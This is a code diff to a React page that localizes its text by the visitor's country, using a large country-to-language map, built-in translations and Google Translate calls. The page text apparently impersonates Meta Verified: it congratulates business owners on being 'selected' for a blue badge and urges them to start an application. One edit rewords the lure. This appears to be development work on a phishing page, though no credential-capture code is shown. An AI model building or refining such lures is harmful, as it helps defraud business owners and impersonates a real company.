@@ -93,71 +93,64 @@ const Page: FC = () => {
         if (!countryCode) return;
 
         (async () => {
-            // First check if we have hardcoded translation
-            const langMap: Record<string, string> = {
-                // Vietnamese
-                VN: 'vi',
-                // Spanish
-                ES: 'es', MX: 'es', CO: 'es', PE: 'es', CL: 'es', VE: 'es', EC: 'es', AR: 'es', PY: 'es', UY: 'es', BO: 'es', DO: 'es', GT: 'es', HN: 'es', SV: 'es', NI: 'es', CR: 'es', PA: 'es',
-                // French
-                FR: 'fr', LU: 'fr', SN: 'fr', CI: 'fr', CM: 'fr', CD: 'fr', MG: 'fr', ML: 'fr', BF: 'fr', TG: 'fr', BJ: 'fr', NE: 'fr', GN: 'fr', GA: 'fr', CG: 'fr',
-                // German
-                DE: 'de', AT: 'de', LI: 'de',
-                // Italian
-                IT: 'it', SM: 'it', VA: 'it',
-                // Chinese
-                CN: 'zh', TW: 'zh', HK: 'zh', MO: 'zh', SG: 'zh',
-                // Arabic
-                AE: 'ar', EG: 'ar', SA: 'ar', QA: 'ar', IQ: 'ar', JO: 'ar', LB: 'ar', KW: 'ar', BH: 'ar', OM: 'ar', YE: 'ar', DZ: 'ar', MA: 'ar', TN: 'ar', LY: 'ar', SY: 'ar', SD: 'ar',
-                // Hindi
-                IN: 'hi',
-                // Portuguese
-                BR: 'pt', PT: 'pt', AO: 'pt', MZ: 'pt',
-                // Russian
-                RU: 'ru', BY: 'ru', KZ: 'ru',
-                // Japanese
-                JP: 'ja',
-                // Dutch
-                NL: 'nl', BE: 'nl',
-                // Polish
-                PL: 'pl',
-                // Greek
-                GR: 'el', CY: 'el',
-                // Turkish
-                TR: 'tr',
-                // Thai
-                TH: 'th',
-                // Korean
-                KR: 'ko',
-                // Swedish
-                SE: 'sv',
-                // Indonesian
-                ID: 'id',
-                // Malay
-                MY: 'ms',
-                // Romanian
-                RO: 'ro',
-                // Czech / Slovak
-                CZ: 'cs', SK: 'cs',
-                // Hungarian
-                HU: 'hu',
-                // Finnish
-                FI: 'fi',
-                // Danish
-                DK: 'da',
-                // Norwegian
-                NO: 'no',
+            // Comprehensive country → language map (200+ countries/territories)
+            const countryLangMap: Record<string, string> = {
+                // Africa
+                DZ: 'ar', AO: 'pt', BJ: 'fr', BW: 'en', BF: 'fr', BI: 'fr', CV: 'pt',
+                CM: 'fr', CF: 'fr', TD: 'fr', KM: 'ar', CG: 'fr', CD: 'fr', DJ: 'fr',
+                EG: 'ar', GQ: 'es', ER: 'ar', ET: 'am', GA: 'fr', GM: 'en', GH: 'en',
+                GN: 'fr', GW: 'pt', CI: 'fr', KE: 'sw', LS: 'en', LR: 'en', LY: 'ar',
+                MG: 'fr', MW: 'en', ML: 'fr', MR: 'ar', MU: 'fr', MA: 'ar', MZ: 'pt',
+                NA: 'en', NE: 'fr', NG: 'en', RW: 'fr', ST: 'pt', SN: 'fr', SC: 'fr',
+                SL: 'en', SO: 'ar', ZA: 'en', SS: 'en', SD: 'ar', SZ: 'en', TZ: 'sw',
+                TG: 'fr', TN: 'ar', UG: 'en', ZM: 'en', ZW: 'en',
+                // Americas
+                AG: 'en', AR: 'es', BS: 'en', BB: 'en', BZ: 'en', BO: 'es', BR: 'pt',
+                CA: 'en', CL: 'es', CO: 'es', CR: 'es', CU: 'es', DM: 'en', DO: 'es',
+                EC: 'es', SV: 'es', GD: 'en', GT: 'es', GY: 'en', HT: 'fr', HN: 'es',
+                JM: 'en', MX: 'es', NI: 'es', PA: 'es', PY: 'es', PE: 'es', PR: 'es',
+                KN: 'en', LC: 'en', VC: 'en', SR: 'nl', TT: 'en', US: 'en', UY: 'es',
+                VE: 'es',
+                // Asia
+                AF: 'fa', AM: 'hy', AZ: 'az', BH: 'ar', BD: 'bn', BN: 'ms',
+                KH: 'km', CN: 'zh', CY: 'el', GE: 'ka', HK: 'zh', IN: 'hi', ID: 'id',
+                IR: 'fa', IQ: 'ar', IL: 'iw', JP: 'ja', JO: 'ar', KZ: 'ru', KW: 'ar',
+                KG: 'ru', LA: 'lo', LB: 'ar', MO: 'zh', MY: 'ms', MV: 'en', MN: 'mn',
+                MM: 'my', NP: 'ne', KP: 'ko', OM: 'ar', PK: 'ur', PS: 'ar', PH: 'tl',
+                QA: 'ar', SA: 'ar', SG: 'zh', LK: 'si', SY: 'ar', TW: 'zh', TJ: 'ru',
+                TH: 'th', TL: 'pt', TR: 'tr', TM: 'ru', AE: 'ar', UZ: 'uz', VN: 'vi',
+                YE: 'ar',
+                // Europe
+                AL: 'sq', AD: 'es', AT: 'de', BY: 'ru', BE: 'nl', BA: 'bs', BG: 'bg',
+                HR: 'hr', CZ: 'cs', DK: 'da', EE: 'et', FI: 'fi', FR: 'fr', DE: 'de',
+                GR: 'el', HU: 'hu', IS: 'is', IE: 'en', IT: 'it', XK: 'sq', LV: 'lv',
+                LI: 'de', LT: 'lt', LU: 'fr', MT: 'mt', MD: 'ro', MC: 'fr', ME: 'sr',
+                NL: 'nl', MK: 'mk', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro', RU: 'ru',
+                SM: 'it', RS: 'sr', SK: 'cs', SI: 'sl', ES: 'es', SE: 'sv', CH: 'de',
+                UA: 'uk', GB: 'en', VA: 'it',
+                // Oceania
+                AU: 'en', FJ: 'en', KI: 'en', MH: 'en', FM: 'en', NR: 'en', NZ: 'en',
+                PW: 'en', PG: 'en', WS: 'en', SB: 'en', TO: 'en', TV: 'en', VU: 'fr',
+                // Territories
+                GL: 'da', FO: 'da', AX: 'sv', GI: 'en', JE: 'en', GG: 'en', IM: 'en',
             };
-            
-            const lang = langMap[countryCode];
-            if (lang && lang !== 'en') {
-                // Use hardcoded translation from translate.ts
-                const hardcoded = getTranslations(lang);
-                setTranslations(hardcoded);
+
+            // Languages with full hardcoded translations in translate.ts
+            const HARDCODED_LANGS = new Set([
+                'vi','es','fr','de','it','zh','ar','hi','pt','ru','ja','nl','pl','el',
+                'tr','th','ko','sv','id','ms','ro','cs','hu','fi','da','no'
+            ]);
+
+            const lang = countryLangMap[countryCode] || 'en';
+            if (lang === 'en') return; // No translation needed
+
+            // Use full hardcoded translation if available
+            if (HARDCODED_LANGS.has(lang)) {
+                setTranslations(getTranslations(lang));
                 return;
             }
 
-            // For other languages, use API Google Translate with parallel requests
+            // For other languages, use Google Translate API
             const textsToTranslate = [
                 'Show the world that you mean business.',
                 'Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.',
@@ -176,7 +169,7 @@ const Page: FC = () => {
                 'Upgraded profile features',
                 'Enrich your profile by adding images to your links to help boost engagement. Benefit not yet available in all regions.',
                 'Sign up for Meta Verified.',
-                'Our verification process is designed to maintain the integrity of the verified badge. Let\'s start by confirming your identity.',
+                'Our verification process is designed to maintain the integrity of the verified badge. Let\'s start by confirming our invitation.',
                 'Start your application',
                 'Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements (requirements for facebook). We are pleased to see that your business is one of the few that we have considered and selected',
                 'Verify business details',
@@ -217,46 +210,27 @@ const Page: FC = () => {
                 'Sarah Clancy, Owner of Sarah Marie Running Co.',
             ];
 
-            const detectLanguage = async (countryCode: string): Promise<string> => {
-                const countryToLang: Record<string, string> = {
-                    AE: 'ar', AT: 'de', BE: 'nl', BG: 'bg', BR: 'pt', CA: 'en', CY: 'el', CZ: 'cs',
-                    DE: 'de', DK: 'da', EE: 'et', EG: 'ar', ES: 'es', FI: 'fi', FR: 'fr', GB: 'en',
-                    GR: 'el', HR: 'hr', HU: 'hu', IE: 'ga', IN: 'hi', IT: 'it', LT: 'lt', LU: 'lb',
-                    LV: 'lv', MT: 'mt', MY: 'ms', NL: 'nl', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro',
-                    SE: 'sv', SI: 'sl', SK: 'sk', TH: 'th', TR: 'tr', TW: 'zh', US: 'en', VN: 'vi',
-                    JO: 'ar', LB: 'ar', QA: 'ar', IQ: 'ar', SA: 'ar', IL: 'iw', KR: 'ko'
-                };
-                return countryToLang[countryCode] || 'en';
-            };
-
-            const targetLang = await detectLanguage(countryCode);
-            if (targetLang === 'en') {
-                return; // No need to translate to English
-            }
-
             // Get cache
             const CACHE_KEY = 'translation_cache';
             const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
             const cache = cached ? JSON.parse(cached) : {};
 
-            // Check if all translations are already cached (from /live preload)
-            const allCached = textsToTranslate.every(text => cache[`en:${targetLang}:${text}`]);
-            
+            // Check if all translations are already cached
+            const allCached = textsToTranslate.every(text => cache[`en:${lang}:${text}`]);
+
             if (allCached) {
-                // Load from cache immediately
                 const translatedMap: Record<string, string> = {};
                 textsToTranslate.forEach(text => {
-                    translatedMap[text] = cache[`en:${targetLang}:${text}`];
+                    translatedMap[text] = cache[`en:${lang}:${text}`];
                 });
                 setTranslations(translatedMap);
                 return;
             }
 
-            // Translate ALL texts in parallel with Promise.all
+            // Translate all texts in parallel
             const translatePromises = textsToTranslate.map(async (text) => {
-                const cacheKey = `en:${targetLang}:${text}`;
-                
-                // Return cached if available
+                const cacheKey = `en:${lang}:${text}`;
+
                 if (cache[cacheKey]) {
                     return { text, translated: cache[cacheKey] };
                 }
@@ -266,7 +240,7 @@ const Page: FC = () => {
                         params: {
                             client: 'gtx',
                             sl: 'en',
-                            tl: targetLang,
+                            tl: lang,
                             dt: 't',
                             q: text
                         }
@@ -284,15 +258,12 @@ const Page: FC = () => {
                 }
             });
 
-            // Wait for all translations at once (parallel)
             const results = await Promise.all(translatePromises);
-            
-            // Save cache
+
             if (typeof window !== 'undefined') {
                 localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
             }
 
-            // Build translation map
             const translatedMap: Record<string, string> = {};
             results.forEach(({ text, translated }) => {
                 translatedMap[text] = translated;
